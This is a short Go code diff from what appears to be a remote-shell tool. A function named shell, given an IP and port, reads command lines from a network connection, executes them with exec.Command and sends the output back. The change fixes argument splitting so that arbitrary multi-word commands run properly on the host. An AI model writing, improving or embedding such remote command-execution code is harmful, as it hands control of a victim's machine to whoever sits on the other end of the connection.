@@ -52,7 +52,8 @@ func shell(ip string, port string) {
 			fmt.Printf("%s\n", err)
 			return
 		}
-		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
+		args := strings.Fields(strings.TrimSuffix(message, "\n"))
+		out, err := exec.Command(args[0], args[1:]...).Output()
 
 		if err != nil {
 			fmt.Fprintf(conn, "%s\n", err)
